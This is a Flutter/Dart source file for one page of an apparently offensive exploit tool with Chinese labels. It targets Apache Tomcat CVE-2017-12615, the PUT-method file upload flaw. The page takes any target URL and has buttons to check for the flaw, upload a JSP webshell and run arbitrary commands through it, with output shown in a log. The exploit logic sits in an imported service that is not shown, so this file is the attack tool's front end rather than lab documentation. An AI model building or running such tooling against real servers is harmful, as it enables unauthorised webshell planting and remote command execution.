import 'package:flutter/material.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../theme/app_theme.dart';
import '_vulhub_page_helpers.dart';

class TomcatExpPage extends StatelessWidget {
  const TomcatExpPage({super.key});
  @override
  Widget build(BuildContext context) => Scaffold(
        backgroundColor: AppColors.bgDark,
        appBar: AppBar(
          backgroundColor: AppColors.bgElevated, elevation: 0,
          leading: IconButton(icon: const Icon(Icons.arrow_back), onPressed: () => Navigator.of(context).pop()),
          title: Row(children: [
            const Icon(Icons.cloud_upload, color: AppColors.primary), const SizedBox(width: 8),
            Text('Apache Tomcat CVE-2017-12615 PUT 方法任意文件上传 RCE',
                style: AppTextStyles.heading(size: 14, color: AppColors.primary)),
          ]),
        ),
        body: Padding(padding: const EdgeInsets.all(24),
          child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
            vulhubInfoCard(Icons.cloud_upload, 'Apache Tomcat CVE-2017-12615', 'PUT 方法开启时上传 JSP Webshell 执行命令 (Tomcat 8.5.19)'),
            const SizedBox(height: 16),
            const Expanded(child: _TomcatCard()),
          ]),
        ),
      );
}

class _TomcatCard extends StatefulWidget {
  const _TomcatCard();
  @override
  State<_TomcatCard> createState() => _TomcatCardState();
}

class _TomcatCardState extends State<_TomcatCard> {
  final _urlCtrl = TextEditingController();
  final _cmdCtrl = TextEditingController(text: 'id');
  final _timeoutCtrl = TextEditingController();
  final _logScroll = ScrollController();
  String _log = ''; bool _running = false;

  void _log_(String l) {
    setState(() {
      final lines = _log.isEmpty ? <String>[] : _log.split('\n');
      lines.add(l); if (lines.length > 500) lines.removeRange(0, lines.length - 500);
      _log = lines.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScroll.hasClients) _logScroll.animateTo(_logScroll.position.maxScrollExtent, duration: const Duration(milliseconds: 100), curve: Curves.easeOut);
    });
  }

  TomcatExpService _svc() => TomcatExpService(baseUrl: _urlCtrl.text.trim(), timeout: Duration(seconds: int.tryParse(_timeoutCtrl.text.trim()) ?? 10));

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    setState(() => _running = true); _log_('[*] 检测 CVE-2017-12615 PUT 方法...');
    try { final r = await _svc().check(); _log_(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到 PUT 文件写入'); }
    catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  Future<void> _getShell() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    setState(() => _running = true); _log_('[*] PUT 上传 JSP Webshell...');
    try {
      final shellUrl = await _svc().getShell();
      if (shellUrl != null) { _log_('[+] Webshell 写入成功: $shellUrl?cmd=id'); }
      else { _log_('[-] 写入失败（PUT 方法可能未开启）'); }
    } catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  Future<void> _exec() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => _running = true); _log_('[*] 上传 Shell 并执行: $cmd');
    try {
      final out = await _svc().execRce(cmd);
      _log_(out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或上传失败');
    } catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  @override
  void dispose() { _urlCtrl.dispose(); _cmdCtrl.dispose(); _timeoutCtrl.dispose(); _logScroll.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) => VulhubExpCardShell(
    running: _running, log: _log, logScroll: _logScroll,
    onClearLog: () => setState(() => _log = ''),
    leftPanel: SingleChildScrollView(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      vSecTitle('目标配置'),
      vTf(_urlCtrl, '目标 URL', 'http://target.com:8080/'),
      const SizedBox(height: 8),
      vTf(_timeoutCtrl, '超时(s)', '10', type: TextInputType.number),
      const SizedBox(height: 8),
      Row(children: [
        vBtn('检测漏洞', _running ? null : _check),
        const SizedBox(width: 8),
        vBtn('上传 Shell', _running ? null : _getShell),
      ]),
      const SizedBox(height: 16),
      vSecTitle('命令执行（自动上传 + 执行）'),
      vTf(_cmdCtrl, '命令', 'id'),
      const SizedBox(height: 8),
      vBtn('执行命令', _running ? null : _exec),
    ])),
  );
}
